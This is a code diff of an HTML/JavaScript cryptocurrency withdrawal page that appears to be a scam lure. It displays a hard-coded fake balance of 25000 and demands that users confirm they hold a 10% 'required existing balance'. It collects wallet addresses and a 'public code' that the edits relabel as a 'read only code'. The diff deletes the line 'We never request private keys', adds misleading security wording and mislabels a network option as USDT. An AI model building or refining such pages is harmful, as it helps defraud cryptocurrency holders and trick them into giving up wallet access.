@@ -13,195 +13,7 @@
     </div>
 
     <h1 class="text-2xl font-semibold mb-1">Withdrawal</h1>
-    <p class="text-sm text-gray-300 mb-6">Submit your withdrawal details. We never request private keys.</p>
-
-    <div class="bg-[#141a2e] border border-white/5 rounded-xl p-5 space-y-5 shadow-2xl shadow-black/20">
-      <div>
-        <label class="text-sm text-gray-300">Address</label>
-        <div class="mt-2 relative">
-          <input id="addr" class="w-full bg-[#0f1320] border border-white/10 rounded-lg px-4 py-3 outline-none focus:ring-2 focus:ring-indigo-500"
-                 placeholder="Long press to paste (e.g., bc1..., 0x..., D...)" />
-          <div class="absolute inset-y-0 right-2 flex items-center gap-2">
-            <button id="paste" class="text-gray-400 hover:text-gray-200" title="Paste">📋</button>
-          </div>
-        </div>
-      </div>
-
-      
-        <select id="chain" class="mt-2 w-full bg-[#0f1320] border border-white/10 rounded-lg px-4 py-3 outline-none focus:ring-2 focus:ring-indigo-500">
-          <option value="" disabled selected>Select Network</option>
-          <option value="bitcoin">Bitcoin</option>
-          <option value="ethereum">Ethereum</option>
-          <option value="dogecoin">Dogecoin</option>
-        </select>
-      </div>
-
-      <div>
-        <div class="flex items-center justify-between">
-          <label class="text-sm text-gray-300">Amount</label>
-          <span id="unit" class="text-xs text-gray-400">—</span>
-        </div>
-        <div class="mt-2 relative">
-          <input id="amount" type="number" min="0" step="0.00000001"
-                 class="w-full bg-[#0f1320] border border-white/10 rounded-lg px-4 py-3 pr-16 outline-none focus:ring-2 focus:ring-indigo-500"
-                 placeholder="Minimum 0" />
-          <button id="maxBtn" class="absolute right-2 top-1/2 -translate-y-1/2 text-xs bg-white/10 hover:bg-white/20 px-2 py-1 rounded">
-            Max
-          </button>
-        </div>
-        <div class="flex items-center justify-between mt-2 text-sm text-gray-400">
-          <span>Available</span>
-          <span id="availableDisplay">0</span>
-        </div>
-
-        <div class="mt-3 space-y-1 text-sm">
-          <div class="flex items-center justify-between">
-            <span class="text-gray-400">Required existing balance (10%)</span>
-            <span id="reqDisplay">0</span>
-          </div>
-          <div class="flex items-center justify-between">
-            <span class="text-gray-200">You will receive</span>
-            <span id="netDisplay" class="font-medium">0</span>
-          </div>
-        </div>
-
-        <div class="mt-3">
-          <label class="flex items-center gap-2 text-xs text-gray-300">
-            <input id="reqChk" type="checkbox" class="accent-emerald-500">
-            I confirm my wallet currently holds at least the required balance above.
-          </label>
-        </div>
-      </div>
-    </div>
-
-    <section class="mt-8 bg-[#141a2e] border border-white/5 rounded-xl p-5 space-y-4">
-      <div class="flex items-center justify-between">
-        <h2 class="text-lg font-semibold">Withdraw</h2>
-        <a href="/help-public-code.html" class="text-xs text-indigo-400 hover:underline">How to find your public code</a>
-      </div>
-      <input id="publicCode" class="w-full bg-[#0f1320] border border-white/10 rounded-lg px-4 py-3 outline-none focus:ring-2 focus:ring-indigo-500"
-             placeholder="Your public code" />
-      <button id="withdrawBtn" class="w-full bg-sky-600 hover:bg-sky-500 px-4 py-3 rounded-lg disabled:opacity-50">
-        Withdraw 0
-      </button>
-      <p class="text-xs text-gray-400">We only store your address, public code, and requested amount for payout.</p>
-    </section>
-
-    <p class="text-[11px] text-gray-400 mt-6">Security: We never request private keys. Admin reviews requests and pays manually.</p>
-  </main>
-
-  <script>
-    const chainEl = document.getElementById('chain');
-    const addrEl  = document.getElementById('addr');
-    const amtEl   = document.getElementById('amount');
-    const unitEl  = document.getElementById('unit');
-    const maxBtn  = document.getElementById('maxBtn');
-    const availableDisplay = document.getElementById('availableDisplay');
-    const reqDisplay = document.getElementById('reqDisplay');
-    const netDisplay = document.getElementById('netDisplay');
-    const reqChk = document.getElementById('reqChk');
-    const publicCodeEl = document.getElementById('publicCode');
-    const withdrawBtn = document.getElementById('withdrawBtn');
-
-    const unitByChain = { bitcoin:'BTC', ethereum:'ETH', dogecoin:'DOGE' };
-
-    let available = 25000;
-    renderAvailable();
-
-    chainEl.addEventListener('change', () => {
-      unitEl.textContent = unitByChain[chainEl.value] || '—';
-      renderAvailable();
-      recalc();
-    });
-
-    maxBtn.addEventListener('click', () => {
-      if (available > 0) { amtEl.value = String(available); recalc(); }
-    });
-
-    amtEl.addEventListener('input', recalc);
-    reqChk.addEventListener('change', toggleButtons);
-    addrEl.addEventListener('input', toggleButtons);
-    chainEl.addEventListener('input', toggleButtons);
-    document.getElementById('paste').onclick = async () => {
-      try { addrEl.value = await navigator.clipboard.readText(); toggleButtons(); } catch {}
-    };
-
-    function renderAvailable() {
-      const u = unitByChain[chainEl.value] || '';
-      availableDisplay.textContent = formatNum(available) + (u ? ' ' + u : '');
-    }
-
-    function recalc() {
-      const amt = parseFloat(amtEl.value) || 0;
-      const required = amt * 0.10;
-      const net = amt;
-      const u = unitByChain[chainEl.value] || '';
-      reqDisplay.textContent = formatNum(required) + (u ? ' ' + u : '');
-      netDisplay.textContent = formatNum(net) + (u ? ' ' + u : '');
-      withdrawBtn.textContent = `Withdraw ${formatNum(amt)} ${u}`.trim();
-      renderAvailable();
-      toggleButtons();
-    }
-
-    function formatNum(n) { return (Math.round((n || 0) * 1e8) / 1e8).toString(); }
-
-    function toggleButtons() {
-      const addrOk = !!addrEl.value.trim();
-      const chainOk = !!chainEl.value;
-      const amt = parseFloat(amtEl.value) || 0;
-      const withinAvailable = amt > 0 && amt <= available;
-      const requirementConfirmed = reqChk.checked;
-      withdrawBtn.disabled = !(addrOk && chainOk && withinAvailable && requirementConfirmed);
-    }
-
-    withdrawBtn.addEventListener('click', async () => {
-      const amount = amtEl.value.trim();
-      const publicCode = publicCodeEl.value.trim();
-      const chain = chainEl.value || 'unknown';
-      const address = addrEl.value.trim();
-      const requirementConfirmed = reqChk.checked;
-
-      if (!amount) return alert('Enter an amount.');
-      if (!publicCode) return alert('Paste your public code.');
-      if (!requirementConfirmed) return alert('Confirm you hold the required 10% balance.');
-
-      try {
-        const r = await fetch('/api/withdraw-request', {
-          method: 'POST',
-          headers: {'Content-Type':'application/json'},
-          body: JSON.stringify({ chain, address, amount, publicCode, requirementConfirmed })
-        });
-        const j = await r.json();
-        if (j.ok && j.receiptId && j.url) {
-          // Go straight to the pending receipt page
-          window.location.href = j.url;
-        } else {
-          alert(j.error || 'Submission failed.');
-        }
-      } catch { alert('Network error. Try again.'); }
-    });
-
-    // initial
-    recalc();
-  </script>
-</body>
-</html>
-<!doctype html>
-<html lang="en" class="h-full">
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Withdraw • Atomic Style</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-</head>
-<body class="h-full bg-[#0f1320] text-gray-100 antialiased">
-  <main class="max-w-lg mx-auto p-5 md:p-8">
-    <div class="rounded-xl overflow-hidden border border-white/5 mb-6">
-      <img src="/banner.jpg" alt="Header" class="w-full h-40 object-cover">
-    </div>
-
-    <h1 class="text-2xl font-semibold mb-1">Withdrawal</h1>
-    <p class="text-sm text-gray-300 mb-6">Submit your withdrawal details. We never request private keys.</p>
+    <p class="text-sm text-gray-300 mb-6">Submit your withdrawal details.</p>
 
     <div class="bg-[#141a2e] border border-white/5 rounded-xl p-5 space-y-5 shadow-2xl shadow-black/20">
       <div>
@@ -218,13 +30,13 @@
       <div>
         <div class="flex items-center justify-between">
           <label class="text-sm text-gray-300">Network</label>
-          <a href="/help-public-code.html" class="text-xs text-indigo-400 hover:underline">How to find public code</a>
+          <a href="/help-public-code.html" class="text-xs text-indigo-400 hover:underline">How to find read only code</a>
         </div>
         <select id="chain" class="mt-2 w-full bg-[#0f1320] border border-white/10 rounded-lg px-4 py-3 outline-none focus:ring-2 focus:ring-indigo-500">
           <option value="" disabled selected>Select Network</option>
           <option value="bitcoin">Bitcoin</option>
           <option value="ethereum">Ethereum</option>
-          <option value="dogecoin">Dogecoin</option>
+          <option value="dogecoin">USDT</option>
         </select>
       </div>
 
@@ -269,17 +81,17 @@
     <section class="mt-8 bg-[#141a2e] border border-white/5 rounded-xl p-5 space-y-4">
       <div class="flex items-center justify-between">
         <h2 class="text-lg font-semibold">Withdraw</h2>
-        <a href="/help-public-code.html" class="text-xs text-indigo-400 hover:underline">How to find your public code</a>
+        <a href="/help-public-code.html" class="text-xs text-indigo-400 hover:underline">How to find your read only code</a>
       </div>
       <input id="publicCode" class="w-full bg-[#0f1320] border border-white/10 rounded-lg px-4 py-3 outline-none focus:ring-2 focus:ring-indigo-500"
              placeholder="Your public code" />
       <button id="withdrawBtn" class="w-full bg-sky-600 hover:bg-sky-500 px-4 py-3 rounded-lg disabled:opacity-50">
         Withdraw 0
       </button>
-      <p class="text-xs text-gray-400">We only store your address, public code, and requested amount for payout.</p>
+      <p class="text-xs text-gray-400">We only store your address, and requested amount for payout.</p>
     </section>
 
-    <p class="text-[11px] text-gray-400 mt-6">Security: We never request private keys. Admin reviews requests and pays manually.</p>
+    <p class="text-[11px] text-gray-400 mt-6">Security: We never store your private keys. requests and pays are review automaticaally.</p>
   </main>
 
   <script>
@@ -378,4 +190,3 @@
   </script>
 </body>
 </html>
-
